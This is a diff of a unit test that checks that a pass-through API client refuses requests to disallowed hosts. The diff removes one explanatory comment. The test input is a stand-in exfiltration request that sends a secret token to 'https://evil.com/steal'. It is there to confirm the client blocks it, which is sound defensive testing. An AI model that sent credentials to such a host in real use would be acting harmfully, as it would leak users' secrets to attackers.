@@ -6,7 +6,6 @@ class PassThroughClientTest {
 
     @Test
     void testRefusesNonTrevorismHostWithoutCallingOut() {
-        // A disallowed host must return an isError result immediately (no network, no token sent).
         Map result = new PassThroughClient().callApi("GET", "https://evil.com/steal", null, "secret-token")
         assert result.isError == true
         assert result.content[0].text.contains("Refused")
